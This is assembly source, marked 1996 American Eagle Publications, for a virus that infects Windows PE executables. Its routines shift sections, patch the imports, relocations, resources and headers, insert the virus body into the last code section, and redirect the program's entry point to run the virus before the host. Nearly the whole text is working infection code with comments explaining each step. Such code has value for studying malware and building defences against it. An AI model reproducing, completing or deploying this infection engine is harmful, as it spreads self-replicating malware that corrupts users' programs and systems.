;(C) 1996 American Eagle Publications, Inc. All rights reserved.
;******************************************************************************
;This routine updates the image data directory in the PE header so that all
;of the vectors point to the right places if sections have been moved.
UPDATE_IMG_DAT_DIR:
        call    GET_VMSIZE
        mov     edx,eax                 ;save add-on factor in edx
        mov     ecx,[ebp+esi+116]       ;get # entries in image data directory
        dec     ecx
        mov     ebx,ecx
        shl     ebx,3
        add     ebx,esi
        add     ebx,120                 ;ebx points to last IDD entry
UIDDL:  mov     eax,[ebp+ebx]           ;get entry
        cmp     eax,[ebp+esi+40]        ;compare with entry point
        jc      UIDD1                   ;no adjust needed
        add     [ebp+ebx],edx           ;else adjust
UIDD1:  or      ecx,ecx
        jz      UIDDR
        dec     ecx
        sub     ebx,8
        jmp     UIDDL
UIDDR:  ret

;******************************************************************************
;This routine updates the IMAGE_RESOURCE_DATA_ENTRY pointers to the resources
;in the resource section
UPDATE_RESOURCES:
        xor     ecx,ecx                 ;find the resource section first
        mov     cx,[ebp+esi+6]          ;get section count
        dec     ecx
USL:    push    ecx
        call    GET_SEC_PTR             ;pointer to section header
        mov     eax,[ebp+ebx]           ;get 1st 4 letters of name
        cmp     [ebp+ebx],'rsr.'
        jne     US1
        cmp     DWORD PTR [ebp+ebx+4],'c'
        je      US2
US1:    pop     ecx
        dec     ecx
        or      ecx,ecx
        jnz     USL
        ret                             ;exit if no rsrc section found

;Ok, we found the .rsrc section, now we must read through it and update the
;data.
US2:    pop     ecx
        mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save it here
        lea     ebx,[ebp+FILEBUF]       ;point to start of FILEBUF
        call    PROCESS_RES_DIR         ;process resource root directory (recursive)
        ret                             ;ok, all done

;This routine processes the resource directory pointed to in the file by eax,
;and which has a memory location reserved for it at ebx.
PROCESS_RES_DIR:
        push    ebx
        call    FILE_SEEK               ;and go there
        pop     edx
        push    edx                     ;get load location in edx
        mov     ecx,16                  ;read 16 bytes to start with
        call    FILE_READ               ;load start of Image Resource Directory
        pop     ebx                     ;prep to read actual directory entries
        xor     ecx,ecx
        mov     cx,[ebx+12]             ;ecx=# of named entries
        add     cx,[ebx+14]             ;# of named + # of id entries
        push    ecx
        push    ebx
        shl     ecx,3                   ;multiply by 8
        lea     edx,[ebx+16]            ;read right after the dir header
        call    FILE_READ               ;now we've read the entire directory
        pop     ebx
        pop     ecx                     ;ecx=# of directory entries
        or      ecx,ecx                 ;check for zero
        jz      PRD3                    ;and just exit if so
        shl     ecx,3                   ;multiply by 8 to form index
PRDL:   sub     ecx,8
        push    ecx
        mov     eax,[ecx+ebx+16+4]      ;get OffsetToData
        and     eax,7FFFFFFFH           ;eax = distance from start of .rsrc to dir entry
        add     eax,[ebp+TEMP]          ;add distance to start of .rsrc
        xor     edx,edx
        mov     dx,[ebx+12]             ;ecx=# of named entries
        add     dx,[ebx+14]             ;# of named + # of id entries
        shl     edx,3                   ;multiply by 8
        add     edx,16                  ;and add size of directory header
        push    ebx
        test    [ecx+ebx+16+4],80000000H   ;Another directory or resource?
        jz      PRD1                    ;go handle resource
        add     ebx,edx                 ;ebx=memory pointer to put subdir in
        call    PROCESS_RES_DIR         ;recursively handle subdirectory
        jmp     PRD2
PRD1:   add     ebx,edx                 ;ebx=memory pointer to put subdir in
        call    PROCESS_RES_DATA        ;else go process resource data entry
PRD2:   pop     ebx
        pop     ecx
        or      ecx,ecx
        jnz     PRDL                    ;if more left to process, go do them
PRD3:   ret

;This routine processes an Image Resource Data Entry structure. It's the main
;thing that the virus needs to deal with in order to handle resources properly,
;since it contains an rva to the actual resource, and this rva must be updated.
;When called, it is passed the file offset where the data entry structure is
;located in eax, and a memory area it can load it into in ebx.
PROCESS_RES_DATA:
        push    eax
        push    ebx
        call    FILE_SEEK               ;seek to data entry structure
        pop     edx
        push    edx                     ;prep to read it to allocated memory
        mov     ecx,12                  ;size of structure
        call    FILE_READ
        pop     ebx
        pop     eax
        push    ebx
        call    FILE_SEEK               ;seek back to start of data entry
        call    GET_VMSIZE
        pop     edx
        mov     ecx,[edx]               ;see if it needs an update
        cmp     ecx,[ebp+esi+40]        ;by comparing with entry pt
        jc      PRDX
        add     [edx],eax               ;update the rva in the data entry struct
        mov     ecx,4
        call    FILE_WRITE              ;update the rva
PRDX:   ret


;******************************************************************************
;This routine updates all of the imports in the file which need to be changed
;as a result of moving sections to make room for the virus.
UPDATE_IMPORTS:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
        dec     ecx
UIL:    push    ecx
        call    GET_SEC_PTR             ;pointer to section header
        mov     eax,[ebp+ebx]           ;get 1st 4 letters of name
        cmp     [ebp+ebx],'adi.'
        jne     UI1
        cmp     DWORD PTR [ebp+ebx+4],'at'
        je      UI2
UI1:    pop     ecx
        dec     ecx
        or      ecx,ecx
        jnz     UIL
        ret                             ;exit if no reloc section found

;Ok, we found the .idata section, now we must read through it and update the
;data.
UI2:    pop     ecx
        mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save file pointer here
UI3:    mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;and go there
        mov     ecx,20                  ;read the Image Import Descriptor record
        lea     edx,[ebp+IID]           ;into IID
        call    FILE_READ
        call    GET_VMSIZE              ;address to increment rva's
        mov     ebx,eax                 ;store it here for now

        mov     eax,[ebp+IID]           ;get the Characteristics @ for this block
        or      eax,eax                 ;zero?
        jz      UI4                     ;yes, done reading
        cmp     eax,[ebp+esi+40]        ;compare rva with entry point
        jc      UI31
        add     [ebp+IID],ebx           ;update it
UI31:   mov     eax,[ebp+IID+12]        ;now check rva for DLL name
        cmp     eax,[ebp+esi+40]        ;compare with entry point
        jc      UI32
        add     [ebp+IID+12],ebx        ;update it if needed
UI32:   mov     eax,[ebp+IID+16]        ;now check rva of Image_Import_By_Name structure
        cmp     eax,[ebp+esi+40]        ;compare with entry point
        jc      UI33
        add     [ebp+IID+16],ebx        ;update if necessary
UI33:   mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;go back to IID record
        mov     ecx,20
        lea     edx,[ebp+IID]
        call    FILE_WRITE              ;and write record back to file
UI35:   add     DWORD PTR [ebp+TEMP],20 ;update current file pointer
        mov     eax,[ebp+IID]           ;update the first ImageImportByName structure
        or      eax,eax                 ;borland leaves this structure unfilled
        jz      UI36                    ;so skip it in this case
        call    UPDATE_IIBN
UI36:   mov     eax,[ebp+IID+4]         ;see if this file has been bound
        or      eax,eax
        jnz     UI3                     ;yes, don't update next IIBN
        mov     eax,[ebp+IID+16]        ;FirstThunk ImageImportByName structure
        call    UPDATE_IIBN             ;this one is always used
        jmp     UI3                     ;and go do another
UI4:    ret                             ;all done, exit

;This updates an ImageImportByName structure whose rva is pointed to by eax
;upon entry. It moves all of the rva's as necessary to point to the proper
;name info for the imports.
UPDATE_IIBN:
        call    RVA_TO_FILEPTR          ;make a file pointer out of the rva
        push    eax
        call    FILE_SEEK               ;now go there
        mov     ecx,4096
        lea     edx,[ebp+FILEBUF]
        call    FILE_READ               ;read the import hint/name pointer table
        call    GET_VMSIZE              ;amount to add to rva's
        mov     edx,eax                 ;save it here
        xor     ebx,ebx                 ;use ebx to point into table
UIIBNL: mov     eax,[ebp+ebx+FILEBUF]   ;get an array element
        or      eax,eax                 ;are we done?
        jz      UIIBN2                  ;yes, go update to file
        test    eax,80000000H           ;an ordinal import??
        jnz     UIIBN1                  ;yes, this is not an rva
        cmp     eax,[ebp+esi+40]        ;do we need to update?
        jc      UIIBN1                  ;not if rva < entry point
        add     eax,edx                 ;yes, update it
UIIBN1: mov     [ebp+ebx+FILEBUF],eax   ;and store in memory again
        add     ebx,4                   ;and go to next element
        jmp     UIIBNL
UIIBN2: pop     eax                     ;go back to IIBN
        push    ebx                     ;save bytes to write
        call    FILE_SEEK
        pop     ecx
        lea     edx,[ebp+FILEBUF]
        call    FILE_WRITE              ;write IIBN back to disk
        ret

;******************************************************************************
;This routine updates the relocation vectors in the .reloc section so that
;any which have moved will again point to the proper areas. This involves
;updating both the relocation vectors and updating the actual relocatables
;themselves. This process is carried out in two separate steps.
UPDATE_RELOCATIONS:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
        dec     ecx
URL:    push    ecx
        call    GET_SEC_PTR             ;pointer to section header
        mov     eax,[ebp+ebx]           ;get 1st 4 letters of name
        cmp     [ebp+ebx],'ler.'
        jne     UR1
        cmp     DWORD PTR [ebp+ebx+4],'co'
        je      UR2
UR1:    pop     ecx
        dec     ecx
        or      ecx,ecx
        jnz     URL
        ret                             ;exit if no reloc section found

;Ok, we found the reloc section, now we must read through it and update the
;relocatables themselves.
UR2:    pop     ecx
        mov     eax,[ebp+ebx+20]        ;get pointer to raw data
        mov     [ebp+TEMP],eax          ;save file pointer here
        push    eax                     ;save the pointer for later use too
UR3:    mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;and go there
        mov     ecx,8                   ;read the Image Base Relocation record
        lea     edx,[ebp+IBR]           ;into IBR
        call    FILE_READ
        mov     eax,[ebp+IBR]           ;get the VirtualAddress for this block
        or      eax,eax                 ;zero?
        jz      UR4                     ;yes, done reading
        cmp     eax,[ebp+esi+40]        ;compare VirtualAddress with entry point
        jc      UR35                    ;VirtualAddress<entry pt, don't update

        mov     ebx,eax                 ;the VirtualAddress must be updated
        call    GET_VMSIZE              ;adder to increment reloc vector
        add     eax,ebx
        mov     [ebp+IBR],eax           ;update it in memory
        mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;go back to IBR record
        mov     ecx,8
        lea     edx,[ebp+IBR]
        call    FILE_WRITE              ;and write record back to file

UR35:   mov     eax,[ebp+IBR+4]         ;get size of Image Base Relocation record
        add     [ebp+TEMP],eax          ;update current file pointer
        jmp     UR3                     ;and go do another

;Now the relocation tables have been updated. The next step is to go back
;and go to all of the relocation vectors in the code and the data and update
;them if they point to data areas that have been moved. (No code has been
;moved by the virus.)
UR4:
        pop     eax                     ;eax=start of .reloc section
        mov     [ebp+TEMP],eax          ;file pointer is here
UR45:   mov     eax,[ebp+TEMP]
        call    FILE_SEEK               ;so go there
        call    PROCESS_BLOCK           ;process a block of relocation ptrs
        jnz     UR45                    ;do another, until done
        ret

;This routine process one block of relocatables, as defined by the Image Base
;Relocation records. It assumes that the current file pointer points to a valid
;block. If the VirtualAddress is zero, the block is invalid and the procedure
;returns with Z set.
PROCESS_BLOCK:
        mov     ecx,8
        lea     edx,[ebp+IBR]
        call    FILE_READ               ;read Image Base Relocation header
        mov     ecx,[ebp+IBR+4]         ;get size of whole IBR record
        or      ecx,ecx                 ;all done?
        jz      PBR                     ;if zero, exit with Z set
        add     [ebp+TEMP],ecx          ;update rel ptr table
        sub     ecx,8                   ;size of relocations alone
        lea     edx,[ebp+RELBUF]        ;read relocations into RELBUF
        call    FILE_READ
        mov     eax,[ebp+IBR]           ;get VirtualAddress for relocations
        call    RVA_TO_FILEPTR          ;convert rva to file offset in eax
        push    eax                     ;save it here
        call    FILE_SEEK               ;go there
        mov     ecx,4099                ;read 1 page (watch it, can go over 3)
        lea     edx,[ebp+FILEBUF]       ;into file buffer
        call    FILE_READ
        pop     eax
        call    FILE_SEEK               ;go back to this page
        call    GET_VMSIZE
        mov     edx,eax                 ;edx=amount to move relocations
        mov     ebx,[ebp+IBR+4]
        sub     ebx,8                   ;ebx points to end of relocation vectors
PB1:    sub     ebx,2                   ;next reloc vector
        push    ebx
        mov     ax,[ebp+ebx+RELBUF]
        cwde                            ;eax is 12-bit reloc vector + flags
        test    eax,0000F000H           ;check flags
        jz      PB2                     ;a dummy entry, ignore it
        and     eax,00000FFFH           ;good entry, mask flags
        lea     ebx,[ebp+FILEBUF]
        add     ebx,eax                 ;eax points to the relocatable in FILEBUF
        mov     eax,[ebx]               ;eax is the relocatable
        sub     eax,[ebp+esi+52]        ;subtract image base
        cmp     eax,[ebp+esi+40]        ;compare with entry pt to see if moving it is necessary
        jc      PB2                     ;no relocation necessary
        add     [ebx],edx               ;else relocate it
PB2:    pop     ebx
        or      ebx,ebx                 ;is ebx=0?
        jnz     PB1                     ;no, go do another
        mov     ecx,4099                ;all done relocating things
        lea     edx,[ebp+FILEBUF]       ;now write the data back to the file
        call    FILE_WRITE
        mov     al,1
        or      al,al                   ;reset z on successful exit
PBR:    ret

;******************************************************************************
;This routine finds the last section in the host file which is an executable
;code section. It returns the number of that section in eax. If no executable
;code section is found, it returns with c set. (Though that's really a
;preposterous situation.
FIND_LAST_EXEC:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;ecx=number of sections in the file
FLELP:  dec     ecx
        push    ecx
        call    GET_SEC_PTR             ;pointer to section hdr to ebx
        test    [ebp+ebx+9*4],20000000H ;executable?
        jz      FLE1                    ;nope, continue
        pop     eax                     ;yes, put section number found in eax
        inc     eax
        clc                             ;clear carry
        ret                             ;and exit
FLE1:   pop     ecx
        or      ecx,ecx
        jnz     FLELP
        stc
        ret

;******************************************************************************
;This routine moves the sections which are out beyond the last code section
;out in the file to make room for the virus in the last code section. As it
;does so, it also updates the section headers in memory to account for the
;move. It assumes that eax contains the last code section number when called.
MOVE_SECTIONS:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
MSL:    cmp     ecx,eax                 ;ecx=last code section?
        jne     MS1                     ;no, go move it
        ret                             ;else all done

MS1:    dec     ecx                     ;decrement count
        push    ecx                     ;save next section number
        push    eax                     ;and last exec section number
        call    GET_SEC_PTR             ;ebx points to sec hdr of section ecx
        call    MOVE_SECTION            ;go move it
        pop     eax                     ;restore last exec section number
        pop     ecx                     ;restore next section number
        jmp     MSL                     ;and continue with move till done

;This subroutine moves one section whose section header is pointed to by
;ebp+ebx.
MOVE_SECTION:                   ;Update Section header first
        mov     eax,VIR_SIZE            ;determine memory required by virus
        call    GET_VMSIZE              ;result in eax
        add     [ebp+ebx+12],eax        ;add it to the virtual address
        mov     eax,VIR_SIZE
        call    GET_FSIZE               ;determine size of virus in file
        mov     ecx,[ebp+ebx+20]        ;get PointerToRawData
        or      ecx,ecx
        jz      MSNX                    ;if it's zero, this is uninit data, doesn't take up space
        add     [ebp+ebx+20],eax        ;add virus file size to PointerToRawData
        add     eax,ecx                 ;eax=new PointerToRawData
        mov     edx,[ebp+ebx+16]        ;edx=SizeOfRawData

;Now move edx bytes from offset ecx to offset eax in the file, starting at
;the end, using 4*FB_SIZE chunks at the largest (=Size of FILEBUF).
MSNL:   mov     ebx,4*FB_SIZE
        cmp     edx,ebx                 ;edx<FB_SIZE
        jnc     MSN1
        mov     ebx,edx
MSN1:   sub     edx,ebx
        push    edx                     ;save registers
        push    eax
        push    ecx

        add     eax,edx                 ;eax=destination on move
        add     ecx,edx                 ;ecx=source on move, ebx=bytes to move
        xchg    eax,ecx
        push    ecx                     ;save destination a bit
        push    ebx                     ;save number of bytes to move
        call    FILE_SEEK               ;seek to source
        pop     ecx
        push    ecx                     ;ecx=bytes to read
        lea     edx,[ebp+FILEBUF]       ;edx=buffer @
        call    FILE_READ
        pop     ecx
        pop     eax                     ;get destination
        push    ecx
        call    FILE_SEEK               ;seek to destination
        pop     ecx
        lea     edx,[ebp+FILEBUF]       ;edx=buffer @
        call    FILE_WRITE              ;write to file

        pop     ecx                     ;restore registers
        pop     eax
        pop     edx
        or      edx,edx                 ;any bytes left to move?
        jnz     MSNL                    ;loop until done
MSNX:   ret

;******************************************************************************
;This routine writes the body of the virus to the last code section, and
;adjusts the jump so that the virus will pass control to the host when it is
;finished executing.
INSERT_VIRUS:
        xor     ecx,ecx
        mov     cl,[ebp+SECTION]        ;ecx=sec # to add virus to
        dec     ecx
        call    GET_SEC_PTR             ;ebx points to section hdr
        push    ebx
        mov     eax,[ebp+ebx+20]        ;eax=pointer to raw data
        add     eax,[ebp+ebx+16]        ;add size of raw data
        push    eax
        call    FILE_SEEK               ;and seek to here in the file
        mov     ecx,VIR_SIZE
        lea     edx,[edi+OFFSET VIRUS]
        call    FILE_WRITE              ;write the virus to the file
        pop     eax

        add     eax,OFFSET HADDR - OFFSET VIRUS + 1
        call    FILE_SEEK               ;seek to jump address in file

        pop     ebx                     ;ebx = pointer to section header
        push    ebx
        mov     eax,[ebp+esi+40]        ;get old entry point
        mov     ecx,[ebp+ebx+12]        ;virtual address of section
        add     ecx,[ebp+ebx+16]        ;add rounded up size, ecx=new entry pt
        mov     [ebp+esi+40],ecx        ;save new entry pt here
        add     ecx,OFFSET HADDR + 5 - OFFSET VIRUS
        sub     eax,ecx                 ;eax = relative jump value
        mov     [ebp+TEMP],eax          ;save it here

        mov     ecx,4                   ;write 4 bytes
        lea     edx,[ebp+TEMP]          ;from here
        call    FILE_WRITE              ;to adjust jump address in host

        pop     ebx                     ;now adjust section header entries
        mov     eax,[ebp+ebx+16]        ;get size of raw data
        add     eax,VIR_SIZE            ;add size of virus to it
        mov     [ebp+ebx+8],eax         ;set VirtualSize
        call    GET_FSIZE               ;determine new SizeOfRawData
        mov     [ebp+ebx+16],eax        ;and save it
        call    GET_MSIZE
        mov     [ebp+esi+28],eax        ;update CodeSize in PE header too

        mov     eax,[ebp+ebx+12]        ;get Virtual Address of code section
        cmp     [ebp+esi+48],eax        ;is BaseOfData<VirtualAddress?
        jc      IVR                     ;yes, don't update it
        mov     eax,VIR_SIZE            ;else proceed with update
        call    GET_VMSIZE              ;determine amount to update
        add     [ebp+esi+48],eax        ;update BaseOfData in PE header
        add     [ebp+esi+80],eax        ;update ImageSize in PE header
        mov     eax,WORKSP              ;update stack commit size
        add     eax,4096
        call    GET_MSIZE
        cmp     eax,[ebp+esi+100]       ;better be at least eax big!
        jc      IV1
        mov     [ebp+esi+100],eax
IV1:    cmp     eax,[ebp+esi+108]       ;do the same for heap commit size
        jc      IVR
        mov     [ebp+esi+108],eax
IVR:    ret                             ;all done

;******************************************************************************
;This routine updates the PE header and the section headers in the host to
;properly reflect the changes made to the file by the virus. Since they have
;already been modified by MOVE_SECTIONS and INSERT_VIRUS to reflect the
;infection, all that is needed is to write the PE header and section headers
;to the file.
UPDATE_PE_HEADER:
        mov     eax,esi
        sub     eax,HDRBUF              ;eax = offset of PE header in file
        call    FILE_SEEK               ;seek to proper place

        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;# of section headers to ecx
        mov     eax,SEC_SIZE            ;size of section header
        mul     ecx                     ;size of section headers
        mov     ecx,PE_SIZE             ;size of PE header
        add     ecx,eax                 ;ecx=amount to write
        lea     edx,[ebp+esi]           ;address to write from
        call    FILE_WRITE              ;update PE header
        ret

